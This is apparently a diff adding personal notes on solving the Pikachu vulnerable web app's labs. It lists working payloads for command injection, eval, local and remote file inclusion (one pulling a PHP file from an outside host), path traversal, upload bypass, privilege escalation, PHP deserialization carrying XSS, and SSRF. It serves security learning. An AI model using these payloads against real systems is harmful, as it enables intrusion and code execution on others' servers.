@@ -90,23 +90,62 @@
 
 5、RCE
 	5.1 exec "ping"
+		127.0.0.1|ifconfig
+		127.0.0.1|whoami
+		
 	5.2 exec "eval"
+		phpinfo();
+		
 6、file include
 	6.1 file include(local)
+		http://1.117.162.201/pikachu/vul/fileinclude/fi_local.php?filename=../../../index.php&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
 	6.2 file include(remote)
+		http://1.117.162.201/pikachu/vul/fileinclude/fi_local.php?filename=http://www.xiaoxiaoran.com/1.php&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
+		
 7、unsafe filedownload（不安全的文件下载）
+	GET /pikachu/vul/unsafedownload/execdownload.php?filename=kb.png HTTP/1.1
+	GET /pikachu/vul/unsafedownload/execdownload.php?filename=../unsafedownload.php HTTP/1.1
+		
 8、unsafe upfileupload（文件上传）
 	8.1 client check(客户端check)
+		<input class="uploadfile" type="file" name="uploadfile" onchange="checkFileExt(this.value)">
+		<input class="uploadfile" type="file" name="uploadfile" onchange="">
 	8.2 client check(Mime type)
+		Content-Type: application/octet-stream
+		Content-Type: jpeg/jpg
 	8.3 getimagesize
+		
+	
 9、Over Permission
 	9.1 水平越权
+		GET /pikachu/vul/overpermission/op1/op1_mem.php?username=lili&submit=%E7
+		GET /pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&submit=%E7
 	9.2 垂直越权
+		http://1.117.162.201/pikachu/vul/overpermission/op2/op2_admin_edit.php
+		http://1.117.162.201/pikachu/vul/overpermission/op2/op2_user.php
+		
 10、目录遍历
+	http://1.117.162.201/pikachu/vul/dir/dir_list.php?title=../../../index.php
+	
 11、敏感信息泄漏
+	 <!--测试账号:lili/123456-->
+	 
 12、PHP反序列化
+	O:1:"S":1:{s:4:"test";s:29:"<script>alert(1)</script>";}
+	
 13、XXE
 14、URL重定向
+	1.117.162.201/pikachu/vul/urlredirect/urlredirect.php?url=i
+	1.117.162.201/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com
+	
 15、SSRF
 	15.1 ssrf(curl)
+		http://1.117.162.201/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php
 	15.2 ssrf(file_get_content)
+		http://1.117.162.201/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php
+		
+		
+		
+		
+		
+		
